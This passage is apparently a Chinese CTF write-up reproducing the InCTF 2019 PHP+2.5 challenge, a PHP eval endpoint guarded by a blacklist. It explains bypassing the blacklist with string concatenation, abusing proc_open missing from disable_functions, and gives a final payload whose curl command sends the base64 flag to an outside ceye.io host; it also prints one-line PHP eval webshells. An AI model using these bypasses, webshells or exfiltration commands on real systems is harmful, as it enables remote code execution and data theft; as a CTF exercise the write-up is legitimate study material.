class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP+2.5</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $input;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $input)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>($blacklist);</span><br><span class="line">    <span class="keyword">if</span> (strlen($input) &gt; <span class="number">100</span>) &#123;  <span class="comment">#That is random no. I took ;)</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is getting really large input..."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille = $_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($thisfille)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($thisfille)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($ass <span class="keyword">as</span> $hole) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在PHP+1.5的基础上，增加了对input长度的限制，只有当input参数值的大小&lt;100字节时才能通过检测，提高了利用门槛。</p><h2 id="0x02-题解"><a href="#0x02-题解" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><p>首先，当然是要看下phpinfo相关信息，看看disable_functions有没有限制，因为这里相当于直接给了个有WAF的后门。三题所在的环境是一样的，我们从PHP+1入手。</p><p>我们知道phpinfo()函数是系统内置函数，会直接被黑名单过滤掉；这里输入payload <code>?thisfile=c:/&amp;input=phpinfo()；</code>，thisfile参数值为指定一个已存在的目录路径：</p><p><img src="/2019/10/20/InCTF-2019-PHP三题复现/1.png" alt=""></p><p>这里我们可以使用字符串拼接的方式来绕过<code>?thisfile=c:/&amp;input=$a=&#39;php&#39;.&#39;info&#39;;$a();</code>：</p><p><img src="/2019/10/20/InCTF-2019-PHP三题复现/2.png" alt=""></p><p>接着扫描flag所在位置，由于三题环境是一样的，这里只需要在PHP+1环境中找到就行，用glob()函数即可，<code>?thisfile=c:/&amp;input=eval(&#39;echo im&#39;.&#39;plode(&quot; &quot;,glo&#39;.&#39;b(&quot;*&quot;));&#39;);</code>：</p><p><img src="/2019/10/20/InCTF-2019-PHP三题复现/4.png" alt=""></p><p>下面就有个问题了。</p><p>这种字符串拼接方式在PHP+1中固然可行，但是到了后面两题就行不通了。这是因为后两题的第二个黑名单回会过滤特殊字符，包括单双引号等，但是我们发现<code>.</code>和<code>$</code>并未过滤。</p><p>这里，我们从PHP一句话后门可以联想，后门的密码可以添加引号括起来也可以不添加，PHP程序都会将该值当成字符串类型，都能正常执行，如下面两句后门都能正常运行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[c]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因此，借鉴在这种方式，我们可以将payload改为<code>?thisfile=c:/&amp;input=$a=php.info;$a();</code>，这样虽然会在PHP运行后显示Notice注意信息，但并不会报错，会执行成功，下面直接在PHP+2.5中同样是可以执行的：</p><p><img src="/2019/10/20/InCTF-2019-PHP三题复现/3.png" alt=""></p><p>绕过了拼接字符串的坑后，我们直接查看disable_functions项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure><p>虽然过滤了大多数的危险函数，但还有漏网之鱼——proc_open()函数。</p><p><strong>proc_open()函数</strong></p><p>执行一个命令，并且打开用来输入/输出的文件指针。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open ( string $cmd , <span class="keyword">array</span> $descriptorspec , <span class="keyword">array</span> &amp;$pipes [, string $cwd = <span class="keyword">NULL</span> [, <span class="keyword">array</span> $env = <span class="keyword">NULL</span> [, <span class="keyword">array</span> $other_options = <span class="keyword">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure><p>该函数必须的3个参数：</p><ul><li>cmd：要执行的命令。</li><li>descriptorspec：一个索引数组。</li><li>pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一端的文件指针。</li></ul><p>Demo用法，用于Windows环境下弹出计算器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'calc.exe'</span>;</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// 标准输入，子进程从此管道中读取数据</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// 标准输出，子进程向此管道中写入数据</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>) <span class="comment">// 标准错误，子进程向此管道中写入数据</span></span><br><span class="line">);</span><br><span class="line">$pipes = <span class="keyword">null</span>;</span><br><span class="line">proc_open($cmd, $descriptorspec, $pipes);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>回到题目，发现下划线<code>_</code>被过滤了，要调用proc_open()函数还得进行拼接处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _</span></span><br><span class="line">$u=chr(<span class="number">95</span>);  --&gt;  $b=c.h.r;$u=$b(<span class="number">95</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// proc_open</span></span><br><span class="line">$e=proc.$u.open;</span><br></pre></td></tr></table></figure><p>接着是如何给该函数传参。</p><p>因为该传入的第二个参数是二维数组，其格式如下，如果直接构造会使payload长度超出限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),</span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),</span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>但我们可以通过$_GET方式进行包括数组在内的传参，结合current()和next()函数来构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// current()和next()函数示例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'AAA'</span>,<span class="string">'BBB'</span>,<span class="string">'CCC'</span>);</span><br><span class="line"><span class="keyword">echo</span> current($a);</span><br><span class="line"><span class="keyword">echo</span> next($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// proc_open()示例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">proc_open(current($_GET),next($_GET), $j);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line">$k=$u.G.E.T;$g=$$k;</span><br></pre></td></tr></table></figure><p>proc_open()函数构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _</span></span><br><span class="line">$b=c.h.r;</span><br><span class="line">$u=$b(<span class="number">95</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line">$k=$u.G.E.T;</span><br><span class="line">$g=$$k;</span><br><span class="line"></span><br><span class="line"><span class="comment">// proc_open(current($_GET),next($_GET), $j);</span></span><br><span class="line">$c=curr.ent;</span><br><span class="line">$n=ne.xt;</span><br><span class="line">$e=proc.$u.open;</span><br><span class="line">$e($c($g),$n($g),$j);</span><br></pre></td></tr></table></figure><p>加上传参的完整proc_open()函数构造，注意proc_open()函数第一个参数必须在第一位、第二个数组参数必须紧跟其后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?cmd=curl http://xx.ceye.io/`cat flag.txt|base64|tr &apos;\n&apos; &apos;-&apos;`</span><br><span class="line">&amp;descriptorspec[0][]=pipe</span><br><span class="line">&amp;descriptorspec[0][]=r</span><br><span class="line">&amp;descriptorspec[1][]=pipe</span><br><span class="line">&amp;descriptorspec[1][]=w</span><br><span class="line">&amp;descriptorspec[2][]=pipe</span><br><span class="line">&amp;descriptorspec[2][]=w</span><br><span class="line">&amp;input=$b=c.h.r;$u=$b(95);$k=$u.G.E.T;$g=$$k;$c=curr.ent;$n=ne.xt;$e=proc.$u.open;$e($c($g),$n($g),$j);</span><br></pre></td></tr></table></figure><p>最后整合的Linux版payload如下，往ceye发送flag内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=curl http://xx.ceye.io/`cat flag.txt|base64|tr &apos;\n&apos; &apos;-&apos;`&amp;descriptorspec[0][]=pipe&amp;descriptorspec[0][]=r&amp;descriptorspec[1][]=pipe&amp;descriptorspec[1][]=w&amp;descriptorspec[2][]=pipe&amp;descriptorspec[2][]=w&amp;input=$b=c.h.r;$u=$b(95);$k=$u.G.E.T;$g=$$k;$c=curr.ent;$n=ne.xt;$e=proc.$u.open;$e($c($g),$n($g),$j);&amp;thisfile=/tmp/</span><br></pre></td></tr></table></figure><p>环境换在Linux上，直接用该payload打3道题，都能通杀：</p><p><img src="/2019/10/20/InCTF-2019-PHP三题复现/5.png" alt=""></p><p>在ceye能接收到flag信息：</p><p><img src="/2019/10/20/InCTF-2019-PHP三题复现/6.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xz.aliyun.com/t/6426" target="_blank" rel="noopener">InCTF 2019 - (PHP+1, PHP+1.5 and PHP+2.5) 三题深度复现</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://www.mi1k7ea.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
</feed>
